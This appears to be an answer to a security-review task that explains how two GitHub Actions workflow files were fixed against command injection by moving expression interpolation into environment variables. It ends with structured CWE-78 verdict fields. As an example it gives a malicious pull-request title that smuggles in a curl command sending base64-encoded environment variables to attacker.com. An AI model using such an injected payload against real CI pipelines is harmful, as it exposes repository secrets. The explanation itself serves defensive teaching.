@@ -1,0 +1,31 @@
+The changes in `file_01` and `file_02` both address a common security vulnerability in GitHub Actions workflows: **Command Injection** via expression interpolation.
+
+In GitHub Actions, when you use `${{ expression }}` directly within a `run` script, the value is interpolated into the script as a raw string *before* the shell executes it. If an attacker can control the value of that expression (e.g., via a PR title, a branch name, or an input parameter), they can inject arbitrary shell commands.
+
+For example, in `file_02`, the original code was:
+```bash
+PR_TITLE="${{ github.event.pull_request.title }}"
+```
+If a malicious user creates a PR with the title `"; curl http://attacker.com/$(env | base64); #`, the interpolated script becomes:
+```bash
+PR_TITLE=""; curl http://attacker.com/$(env | base64); #"
+```
+This allows the attacker to execute arbitrary commands in the runner environment, potentially stealing secrets (like `SVN_PASSWORD` seen in `file_01`).
+
+The fix applied in both files is to map these expressions to **environment variables** using the `env` key of the step. When a value is accessed via an environment variable (e.g., `$PR_TITLE` or `$REDEPLOY_TAG`), it is treated as data by the shell, preventing it from being interpreted as part of the command.
+
+In `file_01`, several inputs and outputs were moved to `env`, including:
+- `github.event.inputs.redeploy_tag` $\rightarrow$ `$REDEPLOY_TAG`
+- `needs.release-please.result` $\rightarrow$ `$NEEDS_RELEASE_PLEASE_RESULT`
+- `secrets.SVN_PASSWORD` $\rightarrow$ `$SVN_PASSWORD` (though secrets are generally handled more securely, putting them in `env` is the recommended practice for `run` steps).
+
+In `file_02`, the following were moved to `env`:
+- `github.event.pull_request.title` $\rightarrow$ `$PR_TITLE`
+- `github.head_ref` $\rightarrow$ `$BRANCH_NAME`
+- `steps.version_info.outputs.version` $\rightarrow$ `$VERSION`
+
+This is a classic instance of CWE-78 (OS Command Injection).
+
+VULNERABILITY_FOUND: yes
+CWE_ID: CWE-78
+CWE_NAME: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
